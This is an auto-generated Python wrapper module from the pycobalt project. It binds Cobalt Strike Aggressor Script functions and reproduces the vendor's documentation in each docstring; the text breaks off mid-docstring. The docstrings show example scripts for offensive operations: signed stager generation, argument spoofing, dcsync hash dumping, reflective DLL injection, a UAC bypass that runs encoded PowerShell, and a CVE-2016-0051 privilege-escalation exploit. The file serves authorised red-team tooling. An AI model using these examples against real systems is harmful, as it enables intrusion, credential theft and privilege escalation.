"""
For calling aggressor functions

This file is auto-generated by ./parse_functions_page.py
"""

import os
import sys

import pycobalt.engine as engine


def hasbootstraphint(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Check if a byte array has the x86 or x64 bootstrap hint. Use this function to determine if it's safe to use an artifact that passes GetProcAddress/GetModuleHandleA pointers to this payload.
        Arguments
        $1 - byte array with a payload or shellcode.
        See Also
        &payload_bootstrap_hint

    """

    return engine.call('-hasbootstraphint', args, fork=fork, sync=sync)


def is64(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Check if a session is on an x64 system or not (Beacon only).
        Arguments
        $1 - Beacon/Session ID
        Example
        command x64 {
            foreach $session (beacons()) {
                if (-is64 $session['id']) {
                    println($session);
                }
            }
        }

    """

    return engine.call('-is64', args, fork=fork, sync=sync)


def isactive(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Check if a session is active or not. A session is considered active if (a) it has not acknowledged an exit message AND (b) it is not disconnected from a parent Beacon.
        Arguments
        $1 - Beacon/Session ID
        Example
        command active {
            local('$bid');
            foreach $bid (beacon_ids()) {
                if (-isactive $bid) {
                    println("$bid is active!");
                }
            }
        }

    """

    return engine.call('-isactive', args, fork=fork, sync=sync)


def isadmin(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Check if a session has admin rights
        Arguments
        $1 - Beacon/Session ID
        Example
        command admin_sessions {
            foreach $session (beacons()) {
                if (-isadmin $session['id']) {
                    println($session);
                }
            }
        }

    """

    return engine.call('-isadmin', args, fork=fork, sync=sync)


def isbeacon(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Check if a session is a Beacon or not.
        Arguments
        $1 - Beacon/Session ID
        Example
        command beacons {
            foreach $session (beacons()) {
                if (-isbeacon $session['id']) {
                    println($session);
                }
            }
        }

    """

    return engine.call('-isbeacon', args, fork=fork, sync=sync)


def isssh(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Check if a session is an SSH session or not.
        Arguments
        $1 - Beacon/Session ID
        Example
        command ssh_sessions {
            foreach $session (beacons()) {
                if (-isssh $session['id']) {
                    println($session);
                }
            }
        }

    """

    return engine.call('-isssh', args, fork=fork, sync=sync)


def action(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Post a public action message to the event log. This is similar to the /me command.
        Arguments
        $1 - the message
        Example
        action("dances!");

    """

    return engine.call('action', args, fork=fork, sync=sync)


def addTab(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        create a tab to display a GUI object.
        Arguments
        $1 - the title of the tab
        $2 - a GUI object. A GUI object is one that is an instance of javax.swing.JComponent.
        $3 - a tooltip to display when a user hovers over this tab.
        Example
        $label = [new javax.swing.JLabel: "Hello World"];
        addTab("Hello!", $label, "this is an example");

    """

    return engine.call('addTab', args, fork=fork, sync=sync)


def addVisualization(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register a visualization with Cobalt Strike.
        Arguments
        $1 - the name of the visualization
        $2 - a javax.swing.JComponent object
        Example
        $label = [new javax.swing.JLabel: "Hello World!"];
        addVisualization("Hello World", $label);

        See Also
        &showVisualization

    """

    return engine.call('addVisualization', args, fork=fork, sync=sync)


def add_to_clipboard(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Add text to the clipboard, notify the user.
        Arguments
        $1 - the text to add to the clipboard
        Example
        add_to_clipboard("Paste me you fool!");

    """

    return engine.call('add_to_clipboard', args, fork=fork, sync=sync)


def alias(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Creates an alias command in the Beacon console
        Arguments
        $1 - the alias name to bind to
        $2 - a callback function. Called when the user runs the alias. Arguments are: $0 = command run, $1 = beacon id, $2 = arguments.
        Example
        alias("foo", {
            btask($1, "foo!");
        });

    """

    return engine.call('alias', args, fork=fork, sync=sync)


def alias_clear(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Removes an alias command (and restores default functionality; if it existed)
        Arguments
        $1 - the alias name to remove
        Example
        alias_clear("foo");

    """

    return engine.call('alias_clear', args, fork=fork, sync=sync)


def applications(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of application information in Cobalt Strike's data model. These applications are results from the System Profiler.
        Returns
        An array of dictionary objects with information about each application.
        Example
        printAll(applications());

    """

    return engine.call('applications', args, fork=fork, sync=sync)


def archives(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a massive list of archived information about your activity from Cobalt Strike's data model. This information is leaned on heavily to reconstruct your activity timeline in Cobalt Strike's reports.
        Returns
        An array of dictionary objects with information about your team's activity.
        Example
        foreach $index => $entry (archives()) {
            println("\c3( $+ $index $+ )\o $entry");
        }

    """

    return engine.call('archives', args, fork=fork, sync=sync)


def artifact(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager instead.
        Generates a stager artifact (exe, dll) from a Cobalt Strike listener
        Arguments
        $1 - the listener name
        $2 - the artifact type
        $3 - deprecated; this parameter no longer has any meaning.
        $4 - x86|x64 - the architecture of the generated stager


        Type
        Description


        dll
        an x86 DLL


        dllx64
        an x64 DLL


        exe
        a plain executable


        powershell
        a powershell script


        python
        a python script


        svcexe
        a service executable


        vbscript
        a Visual Basic script


        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A scalar containing the specified artifact.
        Example
        $data = artifact("my listener", "exe");

        $handle = openf(">out.exe");
        writeb($handle, $data);
        closef($handle);

    """

    return engine.call('artifact', args, fork=fork, sync=sync)


def artifact_general(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generates a payload artifact from arbitrary shellcode.
        Arguments
        $1 - the shellcode
        $2 - the artifact type
        $3 - x86|x64 - the architecture of the generated payload


        Type
        Description


        dll
        a DLL


        exe
        a plain executable


        powershell
        a powershell script


        python
        a python script


        svcexe
        a service executable


        Notes
        Note: while the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3

    """

    return engine.call('artifact_general', args, fork=fork, sync=sync)


def artifact_payload(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generates a stageless payload artifact (exe, dll) from a Cobalt Strike listener name
        Arguments
        $1 - the listener name
        $2 - the artifact type
        $3 - x86|x64 - the architecture of the generated payload (stage)


        Type
        Description


        dll
        a DLL


        exe
        a plain executable


        powershell
        a powershell script


        python
        a python script


        raw
        raw payload stage


        svcexe
        a service executable


        Notes
        Note: while the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3
        Example
        $data = artifact_payload("my listener", "exe", "x86");

    """

    return engine.call('artifact_payload', args, fork=fork, sync=sync)


def artifact_sign(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Sign an EXE or DLL file
        Arguments
        $1 - the contents of the EXE or DLL file to sign
        Notes
        1. This function requires that a code-signing certificate is specified in this server's Malleable C2 profile. If no code-signing certificate is configured, this function will return $1 with no changes.
        2. DO NOT sign an executable or DLL twice. The library Cobalt Strike uses for code-signing will create an invalid (second) signature if the executable or DLL is already signed.
        Returns
        A scalar containing the signed artifact.
        Example
        # generate an artifact!
        $data = artifact("my listener", "exe");

        # sign it.
        $data = artifact_sign($data);

        # save it
        $handle = openf(">out.exe");
        writeb($handle, $data);
        closef($handle);

    """

    return engine.call('artifact_sign', args, fork=fork, sync=sync)


def artifact_stageless(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_payload instead.
        Generates a stageless artifact (exe, dll) from a (local) Cobalt Strike listener
        Arguments
        $1 - the listener name (must be local to this team server)
        $2 - the artifact type
        $3 - x86|x64 - the architecture of the generated payload (stage)
        $4 - proxy configuration string
        $5 - callback function. This function is called when the artifact is ready. The $1 argument is the stageless content.


        Type
        Description


        dll
        an x86 DLL


        dllx64
        an x64 DLL


        exe
        a plain executable


        powershell
        a powershell script


        python
        a python script


        raw
        raw payload stage


        svcexe
        a service executable


        Notes
        1. This function provides the stageless artifact via a callback function. This is necessary because Cobalt Strike generates payload stages on the team server.
        2. The proxy configuration string is the same string you would use with Attacks -> Packages -> Windows Executable (S). *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:password@host:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or "" to use the default behavior. Custom dialogs may use &drow_proxyserver to set this.
        3. This function cannot generate artifacts for listeners on other team servers. This function also cannot generate artifacts for foreign listeners. Limit your use of this function to local listers with stages only. Custom dialogs may use &drow_listener_stage to choose an acceptable listener for this function.
        4. Note: while the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3
        Example
        sub ready {
            local('$handle');
            $handle = openf(">out.exe");
            writeb($handle, $1);
            closef($handle);
        }

        artifact_stageless("my listener", "exe", "x86", "", &ready);

    """

    return engine.call('artifact_stageless', args, fork=fork, sync=sync)


def artifact_stager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generates a stager artifact (exe, dll) from a Cobalt Strike listener
        Arguments
        $1 - the listener name
        $2 - the artifact type
        $3 - x86|x64 - the architecture of the generated stager


        Type
        Description


        dll
        a DLL


        exe
        a plain executable


        powershell
        a powershell script


        python
        a python script


        raw
        the raw file


        svcexe
        a service executable


        vbscript
        a Visual Basic script


        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A scalar containing the specified artifact.
        Example
        $data = artifact_stager("my listener", "exe", "x86");

        $handle = openf(">out.exe");
        writeb($handle, $data);
        closef($handle);

    """

    return engine.call('artifact_stager', args, fork=fork, sync=sync)


def barch(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        *arf* *arf* Returns the architecture of your Beacon session (e.g., x86 or x64)
        Arguments
        $1 - the id for the beacon to pull metadata for
        Note
        If the architecture is unknown (e.g., a DNS Beacon that hasn't sent metadata yet); this function will return x86.
        Example
        println("Arch is: " . barch($1));

    """

    return engine.call('barch', args, fork=fork, sync=sync)


def bargue_add(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        This function adds an option to Beacon's list of commands to spoof arguments for.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command to spoof arguments for. Environment variables are OK here too.
        $3 - the fake arguments to use when the specified command is run.
        Notes
        The process match is exact. If Beacon tries to launch "net.exe", it will not match net, NET.EXE, or c:\windows\system32\net.exe. It will only match net.exe.
        x86 Beacon can only spoof arguments in x86 child processes. Likewise, x64 Beacon can only spoof arguments in x64 child processes.
        The real arguments are written to the memory space that holds the fake arguments. If the real arguments are longer than the fake arguments, the command launch will fail.
        Example
        # spoof cmd.exe arguments.
        bargue_add($1, "%COMSPEC%", "/K \"cd c:\windows\temp & startupdatenow.bat\"");

        # spoof net arguments
        bargue_add($1, "net", "user guest /active:no");

    """

    return engine.call('bargue_add', args, fork=fork, sync=sync)


def bargue_list(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        List the commands + fake arguments Beacon will spoof arguments for.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        bargue_list($1);

    """

    return engine.call('bargue_list', args, fork=fork, sync=sync)


def bargue_remove(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        This function removes an option to Beacon's list of commands to spoof arguments for.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command to spoof arguments for. Environment variables are OK here too.
        Example
        # don't spoof cmd.exe
        bargue_remove($1, "%COMSPEC%");

    """

    return engine.call('bargue_remove', args, fork=fork, sync=sync)


def base64_decode(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Unwrap a base64-encoded string
        Arguments
        $1 - the string to decode
        Returns
        The argument processed by a base64 decoder
        Example
        println(base64_decode(base64_encode("this is a test")));

    """

    return engine.call('base64_decode', args, fork=fork, sync=sync)


def base64_encode(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Base64 encode a string
        Arguments
        $1 - the string to encode
        Returns
        The argument processed by a base64 encoder
        Example
        println(base64_encode("this is a test"));

    """

    return engine.call('base64_encode', args, fork=fork, sync=sync)


def bblockdlls(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Launch child processes with binary signature policy that blocks non-Microsoft DLLs from loading in the process space.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - true or false; block non-Microsoft DLLs in child process
        Notes
        This attribute is available in Windows 10 only.
        Example
        on beacon_initial {
            binput($1, "blockdlls start");
            bblockdlls($1, true);
        }

    """

    return engine.call('bblockdlls', args, fork=fork, sync=sync)


def bbrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generate the beacon browser GUI component. Shows only Beacons.
        Returns
        The beacon browser GUI object (a javax.swing.JComponent)
        Example
        addVisualization("Beacon Browser", bbrowser());

        See Also
        &showVisualization

    """

    return engine.call('bbrowser', args, fork=fork, sync=sync)


def bbrowserpivot(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Start a Browser Pivot
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject the browser pivot agent into.
        $3 - the architecture of the target PID (x86|x64)
        Example
        bbrowserpivot($1, 1234, "x86");

    """

    return engine.call('bbrowserpivot', args, fork=fork, sync=sync)


def bbrowserpivot_stop(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Stop a Browser Pivot
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        bbrowserpivot_stop($1);

    """

    return engine.call('bbrowserpivot_stop', args, fork=fork, sync=sync)


def bbypassuac(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.0.
    """

    return engine.call('bbypassuac', args, fork=fork, sync=sync)


def bcancel(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Cancel a file download
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file to cancel or a wildcard.
        Example
        item "&Cancel Downloads" {
            bcancel($1, "*");
        }

    """

    return engine.call('bcancel', args, fork=fork, sync=sync)


def bcd(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask a Beacon to change it's current working directory.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the folder to change to.
        Example
        # create a command to change to the user's home directory
        alias home {
            $home = "c:\\users\\" . binfo($1, "user");
            bcd($1, $home);
        }

    """

    return engine.call('bcd', args, fork=fork, sync=sync)


def bcheckin(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask a Beacon to checkin. This is basically a no-op for Beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "&Checkin" {
            binput($1, "checkin");
            bcheckin($1);
        }

    """

    return engine.call('bcheckin', args, fork=fork, sync=sync)


def bclear(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        This is the "oops" command. It clears the queued tasks for the specified beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        bclear($1);

    """

    return engine.call('bclear', args, fork=fork, sync=sync)


def bconnect(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon (or SSH session) to connect to a Beacon peer over a TCP socket
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to connect to
        $3 - [optional] the port to use. Default profile port is used otherwise.
        Note
        Use &beacon_link if you want a script function that will connect or link based on a listener configuration.
        Example
        bconnect($1, "DC");

    """

    return engine.call('bconnect', args, fork=fork, sync=sync)


def bcovertvpn(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to deploy a Covert VPN client.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the Covert VPN interface to deploy
        $3 - the IP address of the interface [on target] to bridge into
        $4 - [optional] the MAC address of the Covert VPN interface
        Example
        bcovertvpn($1, "phear0", "172.16.48.18");

    """

    return engine.call('bcovertvpn', args, fork=fork, sync=sync)


def bcp(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to copy a file or folder.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file or folder to copy
        $3 - the destination
        Example
        bcp($1, "evil.exe", "\\\\target\\C$\\evil.exe");

    """

    return engine.call('bcp', args, silent=silent, fork=fork, sync=sync)


def bdata(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get metadata for a Beacon session.
        Arguments
        $1 - the id for the beacon to pull metadata for
        Returns
        A dictionary object with metadata about the Beacon session.
        Example
        println(bdata("1234"));

    """

    return engine.call('bdata', args, fork=fork, sync=sync)


def bdcsync(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Use mimikatz's dcsync command to pull a user's password hash from a domain controller.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - fully qualified name of the domain
        $3 - DOMAIN\user to pull hashes for (optional)
        Notes
        If $3 is left out, dcsync will dump all domain hashes.
        Example
        # dump a specific account
        bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator");

        # dump all accounts
        bdcsync($1, "PLAYLAND.testlab");

    """

    return engine.call('bdcsync', args, fork=fork, sync=sync)


def bdesktop(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Start a VNC session.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "&Desktop (VNC)" {
            bdesktop($1);
        }

    """

    return engine.call('bdesktop', args, fork=fork, sync=sync)


def bdllinject(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Inject a Reflective DLL into a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject the DLL into
        $3 - the local path to the Reflective DLL
        Example
        bdllinject($1, 1234, script_resource("test.dll"));

    """

    return engine.call('bdllinject', args, fork=fork, sync=sync)


def bdllload(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Call LoadLibrary() in a remote process with the specified DLL.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target process PID
        $3 - the on-target path to a DLL
        Notes
        The DLL must be the same architecture as the target process.
        Example
        bdllload($1, 1234, "c:\\windows\\mystuff.dll");

    """

    return engine.call('bdllload', args, fork=fork, sync=sync)


def bdllspawn(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Spawn a Reflective DLL as a Beacon post-exploitation job.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path to the Reflective DLL
        $3 - a parameter to pass to the DLL
        $4 - a short description of this post exploitation job (shows up in jobs output)
        $5 - how long to block and wait for output (specified in milliseconds)
        $6 - true/false; use impersonated token when running this post-ex job?
        Notes
        This function will spawn an x86 process if the Reflective DLL is an x86 DLL. Likewise, if the Reflective DLL is an x64 DLL, this function will spawn an x64 process.
        A well-behaved Reflective DLL follows these rules:
        1. Receives a parameter via the reserved DllMain parameter when the DLL_PROCESS_ATTACH reason is specified.
        2. Prints messages to STDOUT
        3. Calls fflush(stdout) to flush STDOUT
        4. Calls ExitProcess(0) when done. This kills the spawned process to host the capability.
        Example (ReflectiveDll.c)
        This example is based on Stephen Fewer's Reflective DLL Injection Project:
        BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
            BOOL bReturnValue = TRUE;
            switch( dwReason ) {
                case DLL_QUERY_HMODULE:
                    if( lpReserved != NULL )
                        *(HMODULE *)lpReserved = hAppInstance;
                    break;
                case DLL_PROCESS_ATTACH:
                    hAppInstance = hinstDLL;

                    /* print some output to the operator */
                    if (lpReserved != NULL) {
                        printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
                    }
                    else {
                        printf("Hello from test.dll. There is no parameter\n");
                    }

                    /* flush STDOUT */
                    fflush(stdout);

                    /* we're done, so let's exit */
                    ExitProcess(0);
                    break;
                case DLL_PROCESS_DETACH:
                case DLL_THREAD_ATTACH:
                case DLL_THREAD_DETACH:
                    break;
            }
            return bReturnValue;
        }

        Example (Aggressor Script)
        alias hello {
            bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
        }

    """

    return engine.call('bdllspawn', args, silent=silent, fork=fork, sync=sync)


def bdownload(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask a Beacon to download a file
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file to request
        Example
        bdownload($1, "c:\\sysprep.inf");

    """

    return engine.call('bdownload', args, silent=silent, fork=fork, sync=sync)


def bdrives(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to list the drives on the compromised system
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "&Drives" {
            binput($1, "drives");
            bdrives($1);
        }

    """

    return engine.call('bdrives', args, fork=fork, sync=sync)


def beacon_command_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Describe a Beacon command.
        Returns
        A string description of the Beacon command.
        Arguments
        $1 - the command
        Example
        println(beacon_command_describe("ls"));

    """

    return engine.call('beacon_command_describe', args, fork=fork, sync=sync)


def beacon_command_detail(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the help information for a Beacon command.
        Returns
        A string with helpful information about a Beacon command.
        Arguments
        $1 - the command
        Example
        println(beacon_command_detail("ls"));

    """

    return engine.call('beacon_command_detail', args, fork=fork, sync=sync)


def beacon_command_register(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register help information for a Beacon command.
        Arguments
        $1 - the command
        $2 - the short description of the command
        $3 - the long-form help for the command.
        Example
        alis echo {
            blog($1, "You typed: " . substr($1, 5));
        }

        beacon_command_register(
            "echo",
            "echo text to beacon log",
            "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");

    """

    return engine.call('beacon_command_register', args, fork=fork, sync=sync)


def beacon_commands(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get a list of Beacon commands.
        Returns
        An array of Beacon commands.
        Example
        printAll(beacon_commands());

    """

    return engine.call('beacon_commands', args, fork=fork, sync=sync)


def beacon_data(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get metadata for a Beacon session.
        Arguments
        $1 - the id for the beacon to pull metadata for
        Returns
        A dictionary object with metadata about the Beacon session.
        Example
        println(beacon_data("1234"));

    """

    return engine.call('beacon_data', args, fork=fork, sync=sync)


def beacon_elevator_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Describe a Beacon command elevator exploit
        Returns
        A string description of the Beacon command elevator
        Arguments
        $1 - the exploit
        Example
        println(beacon_elevator_describe("uac-token-duplication"));

        See Also
        &beacon_elevator_register, &beacon_elevators, &belevate_command
    """

    return engine.call('beacon_elevator_describe', args, fork=fork, sync=sync)


def beacon_elevator_register(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register a Beacon command elevator with Cobalt Strike. This adds an option to the runasadmin command.
        Arguments
        $1 - the exploit short name
        $2 - a description of the exploit
        $3 - the function that implements the exploit ($1 is the Beacon ID, $2 the command and arguments)
        Example
        # Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack
        # Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
        sub schtasks_elevator {
            local('$handle $script $oneliner $command');

            # acknowledge this command
            btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");

            # read in the script
            $handle = openf(getFileProper(script_resource("modules"), "Invoke-EnvBypass.ps1"));
            $script = readb($handle, -1);
            closef($handle);

            # host the script in Beacon
            $oneliner = beacon_host_script($1, $script);

            # base64 encode the command
            $command  = transform($2, "powershell-base64");

            # run the specified command via this exploit.
            bpowerpick!($1, "Invoke-EnvBypass -Command \" $+ $command $+ \"", $oneliner);
        }

        beacon_elevator_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_elevator);

        See Also
        &beacon_elevator_describe, &beacon_elevators, &belevate_command

    """

    return engine.call('beacon_elevator_register', args, fork=fork, sync=sync)


def beacon_elevators(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get a list of command elevator exploits registered with Cobalt Strike.
        Returns
        An array of Beacon command elevators
        Example
        printAll(beacon_elevators());

        See also
        &beacon_elevator_describe, &beacon_elevator_register, &belevate_command

    """

    return engine.call('beacon_elevators', args, fork=fork, sync=sync)


def beacon_execute_job(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Run a command and report its output to the user.
        Arguments
        $1 - the Beacon ID
        $2 - the command to run (environment variables are resolved)
        $3 - the command arguments (environment variables are not resolved).
        $4 - flags that change how the job is launched (e.g., 1 = disable WOW64 file system redirection)
        Notes

        The string $2 and $3 are combined as-is into a command line. Make sure you begin $3 with a space!
        This is the mechanism Cobalt Strike uses for its shell and powershell commands.

        Example
        alias shell {
            local('$args');
            $args = substr($0, 6);
            btask($1, "Tasked beacon to run: $args", "T1059");
            beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
        }

    """

    return engine.call('beacon_execute_job', args, fork=fork, sync=sync)


def beacon_exploit_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Describe a Beacon exploit
        Returns
        A string description of the Beacon exploit
        Arguments
        $1 - the exploit
        Example
        println(beacon_exploit_describe("ms14-058"));

        See Also
        &beacon_exploit_register, &beacon_exploits, &belevate
    """

    return engine.call('beacon_exploit_describe', args, fork=fork, sync=sync)


def beacon_exploit_register(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register a Beacon privilege escalation exploit with Cobalt Strike. This adds an option to the elevate command.
        Arguments
        $1 - the exploit short name
        $2 - a description of the exploit
        $3 - the function that implements the exploit ($1 is the Beacon ID, $2 is the listener)
        Example
        # Integrate windows/local/ms16_016_webdav from Metasploit
        # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb

        sub ms16_016_exploit {
            local('$stager');

            # check if we're on an x64 system and error out.
            if (-is64 $1) {
                berror($1, "ms16-016 exploit is x86 only");
                return;
            }

            # acknowledge this command
            btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016", "T1068");

            # generate our shellcode
            $stager = payload($2, "x86");

            # spawn a Beacon post-ex job with the exploit DLL
            bdllspawn!($1, getFileProper(script_resource("modules"), "cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);

            # link to our payload if it's a TCP or SMB Beacon
            beacon_link($1, $null, $2);
        }

        beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);

        See Also
        &beacon_exploit_describe, &beacon_exploits, &belevate

    """

    return engine.call('beacon_exploit_register', args, fork=fork, sync=sync)


def beacon_exploits(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get a list of privilege escalation exploits registered with Cobalt Strike.
        Returns
        An array of Beacon exploits.
        Example
        printAll(beacon_exploits());

        See also
        &beacon_exploit_describe, &beacon_exploit_register, &belevate

    """

    return engine.call('beacon_exploits', args, fork=fork, sync=sync)


def beacon_host_imported_script(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

